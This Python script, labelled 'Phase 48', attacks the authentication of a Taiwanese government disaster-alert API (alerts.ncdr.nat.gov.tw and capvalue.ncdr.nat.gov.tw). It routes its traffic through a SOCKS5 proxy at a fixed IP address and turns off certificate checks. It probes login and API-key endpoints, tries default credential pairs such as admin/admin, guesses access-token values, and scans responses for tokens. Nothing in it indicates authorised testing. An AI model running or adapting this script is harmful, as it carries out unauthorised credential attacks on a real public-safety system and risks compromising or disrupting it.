#!/usr/bin/env python3
"""Phase 48: Exploit NCDR API auth endpoints - egovToken + API key management."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
BASE = 'https://alerts.ncdr.nat.gov.tw/AddValueApi'

print("=== NCDR API Auth Endpoint Exploitation ===")

# 1. Try the /v1/Auth/Session/Token endpoint (login)
print("\n1. Try login endpoint:")
for path in ['/v1/Auth/Session/Token', '/Auth/Session/Token', '/v1/auth/apikey', '/auth/apikey']:
    try:
        # GET first
        r = requests.get(f'{BASE}{path}', proxies=PROXY, verify=False, timeout=15,
                        headers={'User-Agent': 'Mozilla/5.0'})
        print(f"  GET {path} -> {r.status_code}, len={len(r.text)}")
        if r.status_code != 404 and len(r.text) > 0:
            print(f"    Body: {r.text[:300]}")
    except Exception as e:
        print(f"  GET {path} -> ERR {str(e)[:60]}")

# 2. Try POST to login with common credentials
print("\n2. Try POST login with common credentials:")
login_paths = ['/v1/Auth/Session/Token', '/Auth/Session/Token', '/v1/auth/login', '/auth/login']
creds = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "admin123"},
    {"username": "admin", "password": "password"},
    {"username": "ncdr", "password": "ncdr"},
    {"username": "api", "password": "api"},
]

for path in login_paths:
    for cred in creds:
        try:
            r = requests.post(f'{BASE}{path}', proxies=PROXY, verify=False, timeout=15,
                            json=cred,
                            headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
            if r.status_code == 200:
                print(f"  *** FOUND: POST {path} {cred} -> 200")
                print(f"    Body: {r.text[:500]}")
                break
            elif r.status_code in [401, 403]:
                print(f"  POST {path} {cred['username']} -> {r.status_code}")
            else:
                print(f"  POST {path} {cred['username']} -> {r.status_code} - {r.text[:100]}")
        except Exception as e:
            print(f"  POST {path} {cred['username']} -> ERR")

# 3. Try to get API key from /v1/Alerts/Values/apikey
print("\n3. Try to get API key:")
for path in ['/v1/Alerts/Values/apikey', '/Alerts/Values/apikey', '/v1/apikey', '/apikey']:
    try:
        r = requests.get(f'{BASE}{path}', proxies=PROXY, verify=False, timeout=15,
                        headers={'User-Agent': 'Mozilla/5.0'})
        print(f"  GET {path} -> {r.status_code}, len={len(r.text)}")
        if r.status_code != 404 and len(r.text) > 0:
            print(f"    Body: {r.text[:300]}")
    except Exception as e:
        print(f"  GET {path} -> ERR {str(e)[:60]}")

# 4. Try to use the API key with the actual API (using the egovToken approach)
print("\n4. Try using egovToken with RealTime API:")
# First, try to get a token from the website's login
r = requests.get('https://alerts.ncdr.nat.gov.tw/', proxies=PROXY, verify=False, timeout=20,
                headers={'User-Agent': 'Mozilla/5.0'})
# Look for any existing session or token
print(f"  Homepage: {r.status_code}")
# Try to use the API with egovToken parameter
for token in ['test', 'demo', 'admin', 'public']:
    try:
        r = requests.get(f'{BASE}/RealTime?geocode=000&offset=0&limit=1&egovToken={token}',
                        proxies=PROXY, verify=False, timeout=15,
                        headers={'User-Agent': 'Mozilla/5.0'})
        if r.status_code == 200:
            print(f"  *** egovToken={token} -> 200")
            print(f"    Body: {r.text[:300]}")
            break
        else:
            print(f"  egovToken={token} -> {r.status_code}")
    except Exception as e:
        print(f"  egovToken={token} -> ERR")

# 5. Try the actual website's auth flow
print("\n5. Try website's actual auth flow:")
session = requests.Session()
session.proxies = PROXY
session.verify = False
session.headers.update({'User-Agent': 'Mozilla/5.0'})

# First visit the website to get cookies
r = session.get('https://alerts.ncdr.nat.gov.tw/')
print(f"  Visit website -> {r.status_code}")

# Try to login via the website
for path in ['/web/login', '/login', '/auth/login']:
    try:
        r = session.post(f'https://alerts.ncdr.nat.gov.tw{path}', timeout=15,
                        data={'username': 'admin', 'password': 'admin'})
        print(f"  POST {path} -> {r.status_code}, len={len(r.text)}")
        if r.status_code == 200:
            # Check for redirects or tokens
            print(f"    Location: {r.headers.get('Location', 'None')}")
            # Check for any token in the response
            token_match = re.search(r'(?:token|Token|TOKEN)["\s:=]+["\']?([A-Za-z0-9_\-]+)', r.text)
            if token_match:
                print(f"    Found token: {token_match.group(1)}")
    except Exception as e:
        print(f"  POST {path} -> ERR {str(e)[:60]}")

# 6. Try to get the API key from the capvalue domain with different approaches
print("\n6. Try capvalue.ncdr.nat.gov.tw with different methods:")
for path in ['/', '/api', '/api/key', '/api/capapikey', '/v1/apikey', '/v1/auth/apikey']:
    for accept in ['application/json', 'text/html', '*/*']:
        try:
            r = requests.get(f'https://capvalue.ncdr.nat.gov.tw{path}',
                            proxies=PROXY, verify=False, timeout=15,
                            headers={'User-Agent': 'Mozilla/5.0', 'Accept': accept})
            if r.status_code != 406 and r.status_code != 404:
                print(f"  {path} (Accept={accept}) -> {r.status_code}, len={len(r.text)}")
                if len(r.text) > 0:
                    print(f"    Body: {r.text[:200]}")
                    break
        except:
            pass

print("\nDone.")
